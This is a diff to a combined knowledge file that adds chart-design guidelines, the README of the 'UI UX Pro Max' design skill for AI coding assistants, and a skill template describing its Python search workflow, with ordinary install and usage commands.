+- `large-dataset` - For 1000+ data points, aggregate or sample; provide drill-down for detail instead of rendering all (MD)
+- `number-formatting` - Use locale-aware formatting for numbers, dates, currencies on axes and labels (HIG, MD)
+- `touch-target-chart` - Interactive chart elements (points, segments) must have ≥44pt tap area or expand on touch (Apple HIG)
+- `no-pie-overuse` - Avoid pie/donut for >5 categories; switch to bar chart for clarity
+- `contrast-data` - Data lines/bars vs background ≥3:1; data text labels ≥4.5:1 (WCAG)
+- `legend-interactive` - Legends should be clickable to toggle series visibility (MD)
+- `direct-labeling` - For small datasets, label values directly on the chart to reduce eye travel
+- `tooltip-keyboard` - Tooltip content must be keyboard-reachable and not rely on hover alone (WCAG)
+- `sortable-table` - Data tables must support sorting with aria-sort indicating current sort state (WCAG)
+- `axis-readability` - Axis ticks must not be cramped; maintain readable spacing, auto-skip on small screens
+- `data-density` - Limit information density per chart to avoid cognitive overload; split into multiple charts if needed
+- `trend-emphasis` - Emphasize data trends over decoration; avoid heavy gradients/shadows that obscure the data
+- `gridline-subtle` - Grid lines should be low-contrast (e.g. gray-200) so they don't compete with data
+- `focusable-elements` - Interactive chart elements (points, bars, slices) must be keyboard-navigable (WCAG)
+- `screen-reader-summary` - Provide a text summary or aria-label describing the chart's key insight for screen readers (WCAG)
+- `error-state-chart` - Data load failure must show error message with retry action, not a broken/empty chart
+- `export-option` - For data-heavy products, offer CSV/image export of chart data
+- `drill-down-consistency` - Drill-down interactions must maintain a clear back-path and hierarchy breadcrumb
+- `time-scale-clarity` - Time series charts must clearly label time granularity (day/week/month) and allow switching
+
+## How to Use
+
+Search specific domains using the CLI tool below.
+
+---
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]
+
+### 📘 KNOWLEDGE: NEXUS_README.MD
+
+# [UI UX Pro Max](https://uupm.cc)
+> **VERSION**: v2 | **Last Updated**: 26/05/2026
+
+
+ 
+<p align="center">
+  <a href="https://github.com/nextlevelbuilder/ui-ux-pro-max-skill/releases"><img src="https://img.shields.io/github/v/release/nextlevelbuilder/ui-ux-pro-max-skill?style=for-the-badge&color=blue" alt="GitHub Release"></a>
+  <img src="https://img.shields.io/badge/reasoning_rules-161-green?style=for-the-badge" alt="161 Reasoning Rules">
+  <img src="https://img.shields.io/badge/UI_styles-67-purple?style=for-the-badge" alt="67 UI Styles">
+  <img src="https://img.shields.io/badge/python-3.x-yellow?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.x">
+  <a href="https://github.com/nextlevelbuilder/ui-ux-pro-max-skill/blob/main/LICENSE"><img src="https://img.shields.io/github/license/nextlevelbuilder/ui-ux-pro-max-skill?style=for-the-badge&color=green" alt="License"></a>
+</p>
+
+<p align="center">
+  <a href="https://www.npmjs.com/package/uipro-cli"><img src="https://img.shields.io/npm/v/uipro-cli?style=flat-square&logo=npm&label=CLI" alt="npm"></a>
+  <a href="https://www.npmjs.com/package/uipro-cli"><img src="https://img.shields.io/npm/dm/uipro-cli?style=flat-square&label=downloads" alt="npm downloads"></a>
+  <a href="https://github.com/nextlevelbuilder/ui-ux-pro-max-skill/stargazers"><img src="https://img.shields.io/github/stars/nextlevelbuilder/ui-ux-pro-max-skill?style=flat-square&logo=github" alt="GitHub stars"></a>
+  <a href="https://paypal.me/uiuxpromax"><img src="https://img.shields.io/badge/PayPal-Support%20Development-00457C?style=flat-square&logo=paypal&logoColor=white" alt="PayPal"></a>
+</p>
+
+An AI skill that provides design intelligence for building professional UI/UX across multiple platforms and frameworks.
+
+<p align="center">
+  <a href="https://uupm.cc">
+    <img src="screenshots/website.png" alt="UI UX Pro Max" width="800">
+  </a>
+</p>
+
+<p align="center">
+  <b>If you find this useful, consider supporting the project:</b><br><br>
+  <a href="https://paypal.me/uiuxpromax"><img src="https://img.shields.io/badge/PayPal-Donate-00457C?style=for-the-badge&logo=paypal&logoColor=white" alt="PayPal Donate"></a>
+</p>
+
+<p align="center">
+  <i>Other projects</i><br>
+  <a href="https://nextlevelbuilder.io">NextLevelBuilder.io</a> | <a href="https://goclaw.sh">GoClaw.sh</a> | <a href="https://claudekit.cc">ClaudeKit.cc</a> | <a href="https://tose.sh">TOSE.sh</a>
+</p>
+
+## What's New in v2.0
+
+### Intelligent Design System Generation
+
+The flagship feature of v2.0 is the **Design System Generator** - an AI-powered reasoning engine that analyzes your project requirements and generates a complete, tailored design system in seconds.
+
+```
++----------------------------------------------------------------------------------------+
+|  TARGET: Serenity Spa - RECOMMENDED DESIGN SYSTEM                                      |
++----------------------------------------------------------------------------------------+
+|                                                                                        |
+|  PATTERN: Hero-Centric + Social Proof                                                  |
+|     Conversion: Emotion-driven with trust elements                                     |
+|     CTA: Above fold, repeated after testimonials                                       |
+|     Sections:                                                                          |
+|       1. Hero                                                                          |
+|       2. Services                                                                      |
+|       3. Testimonials                                                                  |
+|       4. Booking                                                                       |
+|       5. Contact                                                                       |
+|                                                                                        |
+|  STYLE: Soft UI Evolution                                                              |
+|     Keywords: Soft shadows, subtle depth, calming, premium feel, organic shapes        |
+|     Best For: Wellness, beauty, lifestyle brands, premium services                     |
+|     Performance: Excellent | Accessibility: WCAG AA                                    |
+|                                                                                        |
+|  COLORS:                                                                               |
+|     Primary:    #E8B4B8 (Soft Pink)                                                    |
+|     Secondary:  #A8D5BA (Sage Green)                                                   |
+|     CTA:        #D4AF37 (Gold)                                                         |
+|     Background: #FFF5F5 (Warm White)                                                   |
+|     Text:       #2D3436 (Charcoal)                                                     |
+|     Notes: Calming palette with gold accents for luxury feel                           |
+|                                                                                        |
+|  TYPOGRAPHY: Cormorant Garamond / Montserrat                                           |
+|     Mood: Elegant, calming, sophisticated                                              |
+|     Best For: Luxury brands, wellness, beauty, editorial                               |
+|     Google Fonts: https://fonts.google.com/share?selection.family=...                  |
+|                                                                                        |
+|  KEY EFFECTS:                                                                          |
+|     Soft shadows + Smooth transitions (200-300ms) + Gentle hover states                |
+|                                                                                        |
+|  AVOID (Anti-patterns):                                                                |
+|     Bright neon colors + Harsh animations + Dark mode + AI purple/pink gradients       |
+|                                                                                        |
+|  PRE-DELIVERY CHECKLIST:                                                               |
+|     [ ] No emojis as icons (use SVG: Heroicons/Lucide)                                 |
+|     [ ] cursor-pointer on all clickable elements                                       |
+|     [ ] Hover states with smooth transitions (150-300ms)                               |
+|     [ ] Light mode: text contrast 4.5:1 minimum                                        |
+|     [ ] Focus states visible for keyboard nav                                          |
+|     [ ] prefers-reduced-motion respected                                               |
+|     [ ] Responsive: 375px, 768px, 1024px, 1440px                                       |
+|                                                                                        |
++----------------------------------------------------------------------------------------+
+```
+
+### How Design System Generation Works
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│  1. USER REQUEST                                                │
+│     "Build a landing page for my beauty spa"                    │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  2. MULTI-DOMAIN SEARCH (5 parallel searches)                   │
+│     • Product type matching (161 categories)                    │
+│     • Style recommendations (67 styles)                         │
+│     • Color palette selection (161 palettes)                    │
+│     • Landing page patterns (24 patterns)                       │
+│     • Typography pairing (57 font combinations)                 │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  3. REASONING ENGINE                                            │
+│     • Match product → UI category rules                         │
+│     • Apply style priorities (BM25 ranking)                     │
+│     • Filter anti-patterns for industry                         │
+│     • Process decision rules (JSON conditions)                  │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  4. COMPLETE DESIGN SYSTEM OUTPUT                               │
+│     Pattern + Style + Colors + Typography + Effects             │
+│     + Anti-patterns to avoid + Pre-delivery checklist           │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### 161 Industry-Specific Reasoning Rules
+
+The reasoning engine includes specialized rules for:
+
+| Category | Examples |
+|----------|----------|
+| **Tech & SaaS** | SaaS, Micro SaaS, B2B Service, Developer Tool / IDE, AI/Chatbot Platform, Cybersecurity Platform |
+| **Finance** | Fintech/Crypto, Banking, Insurance, Personal Finance Tracker, Invoice & Billing Tool |
+| **Healthcare** | Medical Clinic, Pharmacy, Dental, Veterinary, Mental Health, Medication Reminder |
+| **E-commerce** | General, Luxury, Marketplace (P2P), Subscription Box, Food Delivery |
+| **Services** | Beauty/Spa, Restaurant, Hotel, Legal, Home Services, Booking & Appointment |
+| **Creative** | Portfolio, Agency, Photography, Gaming, Music Streaming, Photo/Video Editor |
+| **Lifestyle** | Habit Tracker, Recipe & Cooking, Meditation, Weather, Diary, Mood Tracker |
+| **Emerging Tech** | Web3/NFT, Spatial Computing, Quantum Computing, Autonomous Drone Fleet |
+
+Each rule includes:
+- **Recommended Pattern** - Landing page structure
+- **Style Priority** - Best matching UI styles
+- **Color Mood** - Industry-appropriate palettes
+- **Typography Mood** - Font personality matching
+- **Key Effects** - Animations and interactions
+- **Anti-Patterns** - What NOT to do (e.g., "AI purple/pink gradients" for banking)
+
+## Features
+
+- **67 UI Styles** - Glassmorphism, Claymorphism, Minimalism, Brutalism, Neumorphism, Bento Grid, Dark Mode, AI-Native UI, and more
+- **161 Color Palettes** - Industry-specific palettes aligned 1:1 with the 161 product types
+- **57 Font Pairings** - Curated typography combinations with Google Fonts imports
+- **25 Chart Types** - Recommendations for dashboards and analytics
+- **15 Tech Stacks** - React, Next.js, Astro, Vue, Nuxt.js, Nuxt UI, Svelte, SwiftUI, React Native, Flutter, HTML+Tailwind, shadcn/ui, Jetpack Compose, Angular, Laravel
+- **99 UX Guidelines** - Best practices, anti-patterns, and accessibility rules
+- **161 Reasoning Rules** - Industry-specific design system generation (NEW in v2.0)
+
+### Available Styles (67)
+
+<details>
+<summary><b>General Styles (49)</b></summary>
+
+| # | Style | Best For |
+|---|-------|----------|
+| 1 | Minimalism & Swiss Style | Enterprise apps, dashboards, documentation |
+| 2 | Neumorphism | Health/wellness apps, meditation platforms |
+| 3 | Glassmorphism | Modern SaaS, financial dashboards |
+| 4 | Brutalism | Design portfolios, artistic projects |
+| 5 | 3D & Hyperrealism | Gaming, product showcase, immersive |
+| 6 | Vibrant & Block-based | Startups, creative agencies, gaming |
+| 7 | Dark Mode (OLED) | Night-mode apps, coding platforms |
+| 8 | Accessible & Ethical | Government, healthcare, education |
+| 9 | Claymorphism | Educational apps, children's apps, SaaS |
+| 10 | Aurora UI | Modern SaaS, creative agencies |
+| 11 | Retro-Futurism | Gaming, entertainment, music platforms |
+| 12 | Flat Design | Web apps, mobile apps, startup MVPs |
+| 13 | Skeuomorphism | Legacy apps, gaming, premium products |
+| 14 | Liquid Glass | Premium SaaS, high-end e-commerce |
+| 15 | Motion-Driven | Portfolio sites, storytelling platforms |
+| 16 | Micro-interactions | Mobile apps, touchscreen UIs |
+| 17 | Inclusive Design | Public services, education, healthcare |
+| 18 | Zero Interface | Voice assistants, AI platforms |
+| 19 | Soft UI Evolution | Modern enterprise apps, SaaS |
+| 20 | Neubrutalism | Gen Z brands, startups, Figma-style |
+| 21 | Bento Box Grid | Dashboards, product pages, portfolios |
+| 22 | Y2K Aesthetic | Fashion brands, music, Gen Z |
+| 23 | Cyberpunk UI | Gaming, tech products, crypto apps |
+| 24 | Organic Biophilic | Wellness apps, sustainability brands |
+| 25 | AI-Native UI | AI products, chatbots, copilots |
+| 26 | Memphis Design | Creative agencies, music, youth brands |
+| 27 | Vaporwave | Music platforms, gaming, portfolios |
+| 28 | Dimensional Layering | Dashboards, card layouts, modals |
+| 29 | Exaggerated Minimalism | Fashion, architecture, portfolios |
+| 30 | Kinetic Typography | Hero sections, marketing sites |
+| 31 | Parallax Storytelling | Brand storytelling, product launches |
+| 32 | Swiss Modernism 2.0 | Corporate sites, architecture, editorial |
+| 33 | HUD / Sci-Fi FUI | Sci-fi games, space tech, cybersecurity |
+| 34 | Pixel Art | Indie games, retro tools, creative |
+| 35 | Bento Grids | Product features, dashboards, personal |
+| 36 | Spatial UI (VisionOS) | Spatial computing apps, VR/AR |
+| 37 | E-Ink / Paper | Reading apps, digital newspapers |
+| 38 | Gen Z Chaos / Maximalism | Gen Z lifestyle, music artists |
+| 39 | Biomimetic / Organic 2.0 | Sustainability tech, biotech, health |
+| 40 | Anti-Polish / Raw Aesthetic | Creative portfolios, artist sites |
+| 41 | Tactile Digital / Deformable UI | Modern mobile apps, playful brands |
+| 42 | Nature Distilled | Wellness brands, sustainable products |
+| 43 | Interactive Cursor Design | Creative portfolios, interactive |
+| 44 | Voice-First Multimodal | Voice assistants, accessibility apps |
+| 45 | 3D Product Preview | E-commerce, furniture, fashion |
+| 46 | Gradient Mesh / Aurora Evolved | Hero sections, backgrounds, creative |
+| 47 | Editorial Grid / Magazine | News sites, blogs, magazines |
+| 48 | Chromatic Aberration / RGB Split | Music platforms, gaming, tech |
+| 49 | Vintage Analog / Retro Film | Photography, music/vinyl brands |
+
+</details>
+
+<details>
+<summary><b>Landing Page Styles (8)</b></summary>
+
+| # | Style | Best For |
+|---|-------|----------|
+| 1 | Hero-Centric Design | Products with strong visual identity |
+| 2 | Conversion-Optimized | Lead generation, sales pages |
+| 3 | Feature-Rich Showcase | SaaS, complex products |
+| 4 | Minimal & Direct | Simple products, apps |
+| 5 | Social Proof-Focused | Services, B2C products |
+| 6 | Interactive Product Demo | Software, tools |
+| 7 | Trust & Authority | B2B, enterprise, consulting |
+| 8 | Storytelling-Driven | Brands, agencies, nonprofits |
+
+</details>
+
+<details>
+<summary><b>BI/Analytics Dashboard Styles (10)</b></summary>
+
+| # | Style | Best For |
+|---|-------|----------|
+| 1 | Data-Dense Dashboard | Complex data analysis |
+| 2 | Heat Map & Heatmap Style | Geographic/behavior data |
+| 3 | Executive Dashboard | C-suite summaries |
+| 4 | Real-Time Monitoring | Operations, DevOps |
+| 5 | Drill-Down Analytics | Detailed exploration |
+| 6 | Comparative Analysis Dashboard | Side-by-side comparisons |
+| 7 | Predictive Analytics | Forecasting, ML insights |
+| 8 | User Behavior Analytics | UX research, product analytics |
+| 9 | Financial Dashboard | Finance, accounting |
+| 10 | Sales Intelligence Dashboard | Sales teams, CRM |
+
+</details>
+
+## Installation
+
+### Using Claude Marketplace (Claude Code)
+
+Install directly in Claude Code with two commands:
+
+```
+/plugin marketplace add nextlevelbuilder/ui-ux-pro-max-skill
+/plugin install ui-ux-pro-max@ui-ux-pro-max-skill
+```
+
+### Using CLI (Recommended)
+
+```bash
+# Install CLI globally
+npm install -g uipro-cli
+
+# Go to your project
+cd /path/to/your/project
+
+# Install for your AI assistant
+uipro init --ai claude      # Claude Code
+uipro init --ai cursor      # Cursor
+uipro init --ai windsurf    # Windsurf
+uipro init --ai antigravity # Antigravity
+uipro init --ai copilot     # GitHub Copilot
+uipro init --ai kiro        # Kiro
+uipro init --ai codex       # Codex CLI
+uipro init --ai qoder       # Qoder
+uipro init --ai roocode     # Roo Code
+uipro init --ai gemini      # Gemini CLI
+uipro init --ai trae        # Trae
+uipro init --ai opencode    # OpenCode
+uipro init --ai continue    # Continue
+uipro init --ai codebuddy   # CodeBuddy
+uipro init --ai droid       # Droid (Factory)
+uipro init --ai kilocode    # KiloCode
+uipro init --ai warp        # Warp
+uipro init --ai augment     # Augment
+uipro init --ai all         # All assistants
+```
+
+### Global Install (Available for All Projects)
+
+```bash
+uipro init --ai claude --global   # Install to ~/.claude/skills/
+uipro init --ai cursor --global   # Install to ~/.cursor/skills/
+```
+
+### Other CLI Commands
+
+```bash
+uipro versions              # List available versions
+uipro update                # Update to latest version
+uipro init --offline        # Skip GitHub download, use bundled assets
+uipro uninstall             # Remove skill (auto-detect platform)
+uipro uninstall --ai claude # Remove specific platform
+uipro uninstall --global    # Remove from global install
+```
+
+## Prerequisites
+
+Python 3.x is required for the search script.
+
+```bash
+# Check if Python is installed
+python3 --version
+
+# macOS
+brew install python3
+
+# Ubuntu/Debian
+sudo apt update && sudo apt install python3
+
+# Windows
+winget install Python.Python.3.12
+```
+
+## Usage
+
+### Skill Mode (Auto-activate)
+
+**Supported:** Claude Code, Cursor, Windsurf, Antigravity, Codex CLI, Continue, Gemini CLI, OpenCode, Qoder, CodeBuddy, Droid (Factory), KiloCode, Warp, Augment
+
+The skill activates automatically when you request UI/UX work. Just chat naturally:
+
+```
+Build a landing page for my SaaS product
+```
+
+> **Trae**: Switch to **SOLO** mode first. The skill will activate for UI/UX requests.
+
+### Workflow Mode (Slash Command)
+
+**Supported:** Kiro, GitHub Copilot, Roo Code, KiloCode
+
+Use the slash command to invoke the skill:
+
+```
+/ui-ux-pro-max Build a landing page for my SaaS product
+```
+
+### Example Prompts
+
+```
+Build a landing page for my SaaS product
+
+Create a dashboard for healthcare analytics
+
+Design a portfolio website with dark mode
+
+Make a mobile app UI for e-commerce
+
+Build a fintech banking app with dark theme
+```
+
+### How It Works
+
+1. **You ask** - Request any UI/UX task (build, design, create, implement, review, fix, improve)
+2. **Design System Generated** - The AI automatically generates a complete design system using the reasoning engine
+3. **Smart recommendations** - Based on your product type and requirements, it finds the best matching styles, colors, and typography
+4. **Code generation** - Implements the UI with proper colors, fonts, spacing, and best practices
+5. **Pre-delivery checks** - Validates against common UI/UX anti-patterns
+
+### Supported Stacks
+
+The skill provides stack-specific guidelines for:
+
+| Category | Stacks |
+|----------|--------|
+| **Web (HTML)** | HTML + Tailwind (default) |
+| **React Ecosystem** | React, Next.js, shadcn/ui |
+| **Vue Ecosystem** | Vue, Nuxt.js, Nuxt UI |
+| **Angular** | Angular |
+| **PHP** | Laravel (Blade, Livewire, Inertia.js) |
+| **Other Web** | Svelte, Astro |
+| **iOS** | SwiftUI |
+| **Android** | Jetpack Compose |
+| **Cross-Platform** | React Native, Flutter |
+
+Just mention your preferred stack in the prompt, or let it default to HTML + Tailwind.
+
+## Design System Command (Advanced)
+
+For direct access to the design system generator:
+
+> Note: If you installed via Continue, replace `.claude/skills/` with `.continue/skills/` in the commands below. For Droid (Factory), use `.factory/skills/`.
+
+```bash
+# Generate design system with ASCII output
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "beauty spa wellness" --design-system -p "Serenity Spa"
+
+# Generate with Markdown output
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "fintech banking" --design-system -f markdown
+
+# Domain-specific search
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "glassmorphism" --domain style
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "elegant serif" --domain typography
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "dashboard" --domain chart
+
+# Stack-specific guidelines
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "form validation" --stack react
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "responsive layout" --stack html-tailwind
+```
+
+### Persist Design System (Master + Overrides Pattern)
+
+Save your design system to files for **hierarchical retrieval across sessions**:
+
+```bash
+# Generate and persist to design-system/MASTER.md
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "SaaS dashboard" --design-system --persist -p "MyApp"
+
+# Also create a page-specific override file
+python3 .claude/skills/ui-ux-pro-max/scripts/search.py "SaaS dashboard" --design-system --persist -p "MyApp" --page "dashboard"
+```
+
+This creates a `design-system/` folder structure:
+
+```
+design-system/
+├── MASTER.md           # Global Source of Truth (colors, typography, spacing, components)
+└── pages/
+    └── dashboard.md    # Page-specific overrides (only deviations from Master)
+```
+
+**How hierarchical retrieval works:**
+1. When building a specific page (e.g., "Checkout"), first check `design-system/pages/checkout.md`
+2. If the page file exists, its rules **override** the Master file
+3. If not, use `design-system/MASTER.md` exclusively
+
+**Context-aware retrieval prompt:**
+```
+I am building the [Page Name] page. Please read design-system/MASTER.md.
+Also check if design-system/pages/[page-name].md exists.
+If the page file exists, prioritize its rules.
+If not, use the Master rules exclusively.
+Now, generate the code...
+```
+
+## Architecture & Contributing
+
+### For Users
+
+The codebase has been restructured to use a **template-based generation system**. All platform-specific files (`.cursor/`, `.windsurf/`, `.kiro/`, `.factory/`, etc.) are now generated dynamically by the CLI.
+
+**Always use the CLI to install:**
+
+```bash
+npm install -g uipro-cli
+uipro init --ai <platform>
+```
+
+This ensures you get the latest templates and correct file structure for your AI assistant.
+
+### For Contributors
+
+If you want to contribute to this project:
+
+```bash
+# 1. Clone the repository
+git clone https://github.com/nextlevelbuilder/ui-ux-pro-max-skill.git
+cd ui-ux-pro-max-skill
+
+# 2. Understand the structure
+src/ui-ux-pro-max/           # Source of truth (data, scripts, templates)
+cli/                         # CLI installer (generates files from templates)
+.claude/                     # Local dev/test for Claude Code skill
+.factory/                    # Local dev/test for Droid (Factory) skill
+
+# 3. Make changes in src/ui-ux-pro-max/
+# - data/*.csv              → Database files
+# - scripts/*.py            → Search engine & design system
+# - templates/              → Platform-specific templates
+
+# 4. Sync to CLI and test locally
+cp -r src/ui-ux-pro-max/data/* cli/assets/data/
+cp -r src/ui-ux-pro-max/scripts/* cli/assets/scripts/
+cp -r src/ui-ux-pro-max/templates/* cli/assets/templates/
+
+# 5. Build and test CLI
+cd cli && bun run build
+node dist/index.js init --ai claude --offline  # Test in a temp folder
+
+# 6. Create PR (never push directly to main)
+git checkout -b feat/your-feature
+git commit -m "feat: description"
+git push -u origin feat/your-feature
+gh pr create
+```
+
+See [CLAUDE.md]([CLAUDE.md](../database/NEXUS_CLAUDE.MD)) for detailed development guidelines.
+
+## Star History
+
+[![Star History Chart](https://api.star-history.com/svg?repos=nextlevelbuilder/ui-ux-pro-max-skill&type=Date)](https://star-history.com/#nextlevelbuilder/ui-ux-pro-max-skill&Date)
+
+## License
+
+This project is licensed under the [MIT License](LICENSE).
+
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]
+
 ### 📘 KNOWLEDGE: NEXUS_SECURITY.MD
 
 # Web Security
@@ -20046,6 +35141,373 @@ Clear-Site-Data: "cookies", "storage", "cache"
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]
 
+### 📘 KNOWLEDGE: NEXUS_SKILL-CONTENT.MD
+
+# {{TITLE}}
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+{{DESCRIPTION}}
+{{QUICK_REFERENCE}}
+# Prerequisites
+
+Check if Python is installed:
+
+```bash
+python3 --version || python --version
+```
+
+If Python is not installed, install it based on user's OS:
+
+**macOS:**
+```bash
+brew install python3
+```
+
+**Ubuntu/Debian:**
+```bash
+sudo apt update && sudo apt install python3
+```
+
+**Windows:**
+```powershell
+winget install Python.Python.3.12
+```
+
+---
+
+## How to Use This Skill
+
+Use this skill when the user requests any of the following:
+
+| Scenario | Trigger Examples | Start From |
+|----------|-----------------|------------|
+| **New project / page** | "做一个 landing page"、"Build a dashboard" | Step 1 → Step 2 (design system) |
+| **New component** | "Create a pricing card"、"Add a modal" | Step 3 (domain search: style, ux) |
+| **Choose style / color / font** | "What style fits a fintech app?"、"推荐配色" | Step 2 (design system) |
+| **Review existing UI** | "Review this page for UX issues"、"检查无障碍" | Quick Reference checklist above |
+| **Fix a UI bug** | "Button hover is broken"、"Layout shifts on load" | Quick Reference → relevant section |
+| **Improve / optimize** | "Make this faster"、"Improve mobile experience" | Step 3 (domain search: ux, react) |
+| **Implement dark mode** | "Add dark mode support" | Step 3 (domain: style "dark mode") |
+| **Add charts / data viz** | "Add an analytics dashboard chart" | Step 3 (domain: chart) |
+| **Stack best practices** | "React performance tips"、"SwiftUI navigation" | Step 4 (stack search) |
+
+Follow this workflow:
+
+### Step 1: Analyze User Requirements
+
+Extract key information from user request:
+- **Product type**: Entertainment (social, video, music, gaming), Tool (scanner, editor, converter), Productivity (task manager, notes, calendar), or hybrid
+- **Target audience**: C-end consumer users; consider age group, usage context (commute, leisure, work)
+- **Style keywords**: playful, vibrant, minimal, dark mode, content-first, immersive, etc.
+- **Stack**: React Native (this project's only tech stack)
+
+### Step 2: Generate Design System (REQUIRED)
+
+**Always start with `--design-system`** to get comprehensive recommendations with reasoning:
+
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "<product_type> <industry> <keywords>" --design-system [-p "Project Name"]
+```
+
+This command:
+1. Searches domains in parallel (product, style, color, landing, typography)
+2. Applies reasoning rules from `ui-reasoning.csv` to select best matches
+3. Returns complete design system: pattern, style, colors, typography, effects
+4. Includes anti-patterns to avoid
+
+**Example:**
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "beauty spa wellness service" --design-system -p "Serenity Spa"
+```
+
+### Step 2b: Persist Design System (Master + Overrides Pattern)
+
+To save the design system for **hierarchical retrieval across sessions**, add `--persist`:
+
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "<query>" --design-system --persist -p "Project Name"
+```
+
+This creates:
+- `design-system/MASTER.md` — Global Source of Truth with all design rules
+- `design-system/pages/` — Folder for page-specific overrides
+
+**With page-specific override:**
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "<query>" --design-system --persist -p "Project Name" --page "dashboard"
+```
+
+This also creates:
+- `design-system/pages/dashboard.md` — Page-specific deviations from Master
+
+**How hierarchical retrieval works:**
+1. When building a specific page (e.g., "Checkout"), first check `design-system/pages/checkout.md`
+2. If the page file exists, its rules **override** the Master file
+3. If not, use `design-system/MASTER.md` exclusively
+
+**Context-aware retrieval prompt:**
+```
+I am building the [Page Name] page. Please read design-system/MASTER.md.
+Also check if design-system/pages/[page-name].md exists.
+If the page file exists, prioritize its rules.
+If not, use the Master rules exclusively.
+Now, generate the code...
+```
+
+### Step 3: Supplement with Detailed Searches (as needed)
+
+After getting the design system, use domain searches to get additional details:
+
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "<keyword>" --domain <domain> [-n <max_results>]
+```
+
+**When to use detailed searches:**
+
+| Need | Domain | Example |
+|------|--------|---------|
+| Product type patterns | `product` | `--domain product "entertainment social"` |
+| More style options | `style` | `--domain style "glassmorphism dark"` |
+| Color palettes | `color` | `--domain color "entertainment vibrant"` |
+| Font pairings | `typography` | `--domain typography "playful modern"` |
+| Chart recommendations | `chart` | `--domain chart "real-time dashboard"` |
+| UX best practices | `ux` | `--domain ux "animation accessibility"` |
+| Landing structure | `landing` | `--domain landing "hero social-proof"` |
+| React Native perf | `react` | `--domain react "rerender memo list"` |
+| App interface a11y | `web` | `--domain web "accessibilityLabel touch safe-areas"` |
+| AI prompt / CSS keywords | `prompt` | `--domain prompt "minimalism"` |
+
+### Step 4: Stack Guidelines (React Native)
+
+Get React Native implementation-specific best practices:
+
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "<keyword>" --stack react-native
+```
+
+---
+
+## Search Reference
+
+### Available Domains
+
+| Domain | Use For | Example Keywords |
+|--------|---------|------------------|
+| `product` | Product type recommendations | SaaS, e-commerce, portfolio, healthcare, beauty, service |
+| `style` | UI styles, colors, effects | glassmorphism, minimalism, dark mode, brutalism |
+| `typography` | Font pairings, Google Fonts | elegant, playful, professional, modern |
+| `color` | Color palettes by product type | saas, ecommerce, healthcare, beauty, fintech, service |
+| `landing` | Page structure, CTA strategies | hero, hero-centric, testimonial, pricing, social-proof |
+| `chart` | Chart types, library recommendations | trend, comparison, timeline, funnel, pie |
+| `ux` | Best practices, anti-patterns | animation, accessibility, z-index, loading |
+| `react` | React/Next.js performance | waterfall, bundle, suspense, memo, rerender, cache |
+| `web` | App interface guidelines (iOS/Android/React Native) | accessibilityLabel, touch targets, safe areas, Dynamic Type |
+| `prompt` | AI prompts, CSS keywords | (style name) |
+
+### Available Stacks
+
+| Stack | Focus |
+|-------|-------|
+| `react-native` | Components, Navigation, Lists |
+
+---
+
+## Example Workflow
+
+**User request:** "Make an AI search homepage。"
+
+### Step 1: Analyze Requirements
+- Product type: Tool (AI search engine)
+- Target audience: C-end users looking for fast, intelligent search
+- Style keywords: modern, minimal, content-first, dark mode
+- Stack: React Native
+
+### Step 2: Generate Design System (REQUIRED)
+
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "AI search tool modern minimal" --design-system -p "AI Search"
+```
+
+**Output:** Complete design system with pattern, style, colors, typography, effects, and anti-patterns.
+
+### Step 3: Supplement with Detailed Searches (as needed)
+
+```bash
+# Get style options for a modern tool product
+python3 skills/ui-ux-pro-max/scripts/search.py "minimalism dark mode" --domain style
+
+# Get UX best practices for search interaction and loading
+python3 skills/ui-ux-pro-max/scripts/search.py "search loading animation" --domain ux
+```
+
+### Step 4: Stack Guidelines
+
+```bash
+python3 skills/ui-ux-pro-max/scripts/search.py "list performance navigation" --stack react-native
+```
+
+**Then:** Synthesize design system + detailed searches and implement the design.
+
+---
+
+## Output Formats
+
+The `--design-system` flag supports two output formats:
+
+```bash
+# ASCII box (default) - best for terminal display
+python3 skills/ui-ux-pro-max/scripts/search.py "fintech crypto" --design-system
+
+# Markdown - best for documentation
+python3 skills/ui-ux-pro-max/scripts/search.py "fintech crypto" --design-system -f markdown
+```
+
+---
+
+## Tips for Better Results
+
+### Query Strategy
+
+- Use **multi-dimensional keywords** — combine product + industry + tone + density: `"entertainment social vibrant content-dense"` not just `"app"`
+- Try different keywords for the same need: `"playful neon"` → `"vibrant dark"` → `"content-first minimal"`
+- Use `--design-system` first for full recommendations, then `--domain` to deep-dive any dimension you're unsure about
+- Always add `--stack react-native` for implementation-specific guidance
+
+### Common Sticking Points
+
+| Problem | What to Do |
+|---------|------------|
+| Can't decide on style/color | Re-run `--design-system` with different keywords |
+| Dark mode contrast issues | Quick Reference §6: `color-dark-mode` + `color-accessible-pairs` |
+| Animations feel unnatural | Quick Reference §7: `spring-physics` + `easing` + `exit-faster-than-enter` |
+| Form UX is poor | Quick Reference §8: `inline-validation` + `error-clarity` + `focus-management` |
